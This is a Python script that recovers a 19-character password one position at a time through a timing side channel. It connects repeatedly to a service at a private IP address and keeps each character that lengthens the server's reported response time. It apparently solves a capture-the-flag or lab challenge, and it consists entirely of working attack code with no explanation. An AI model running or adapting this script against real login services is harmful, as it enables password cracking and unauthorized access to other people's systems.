import socket
import string
import os

HOST = "10.21.235.179"
PORT = 5555

PRIME = 19
cracking_order = [(7*i+4)%PRIME for i in range(PRIME)]
print(cracking_order)

current_baseline_password = "_"*PRIME

i = 0
for i in range(PRIME):
    for letter in string.printable.strip():
        current_try_password = list(current_baseline_password)
        current_try_password[cracking_order[i]] = letter
        sent_password = ''.join(current_try_password)
        print("Current try: {}".format(sent_password))
        sent_password += os.linesep
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((HOST, PORT))
            sock.settimeout(100)
            prompt = sock.recv(1024)
            if prompt.strip() == b"Enter the password:":
                sock.send(bytes(sent_password, "UTF-8"))
                response = sock.recv(1024)
                time_taken = float(str(response).split("=  ")[1].split("\\n")[0])
                if time_taken > i+2:
                    current_baseline_password = sent_password.strip()
                    break
            sock.close()
